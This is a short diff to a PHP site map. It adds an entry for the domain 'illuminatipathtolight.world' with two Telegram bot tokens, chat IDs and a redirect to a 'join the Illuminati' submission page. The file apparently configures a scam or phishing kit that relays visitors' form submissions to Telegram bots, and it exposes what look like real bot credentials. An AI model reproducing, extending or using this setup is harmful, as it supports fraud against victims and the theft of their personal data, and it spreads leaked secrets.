@@ -47,6 +47,18 @@ $site_map = [
 
 
 
+
+
+    'illuminatipathtolight.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
+        ],
+        "redirect" => "https://illuminatipathtolight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
+    ],
+
+
+
     
     'illuminatisacred.world' => [
         "bots" => [
